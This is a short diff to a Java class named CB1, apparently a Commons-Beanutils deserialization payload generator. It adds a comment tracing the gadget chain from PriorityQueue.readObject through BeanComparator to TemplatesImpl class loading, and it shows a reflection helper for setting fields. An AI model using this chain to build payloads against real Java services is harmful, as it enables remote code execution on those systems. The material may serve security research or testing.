@@ -12,6 +12,20 @@ import java.lang.reflect.Field;
 import java.util.Base64;
 import java.util.PriorityQueue;
 
+/*
+* PriorityQueue.readObject()
+*  ->PriorityQueue.heapify()
+*   ->PriorityQueue.siftDown()
+*    ->PriorityQueue.siftDownUsingComparator()
+*     ->BeanComparator.compare()
+*      ->PropertyUtils.getProperty("outputProperties")
+*       ->TemplatesImpl.getOutputProperties()
+*        ->TemplatesImpl.newTransformer()
+*         ->TemplatesImpl.getTransletInstance()
+*          ->TemplatesImpl.defineTransletClasses()
+*           ->TemplatesImpl$TransletClassLoader.defineClass()
+* */
+
 public class CB1 {
     public static void setFieldValue(Object o, String fieldName, Object newVal) throws Exception {
         Field f = o.getClass().getDeclaredField(fieldName);
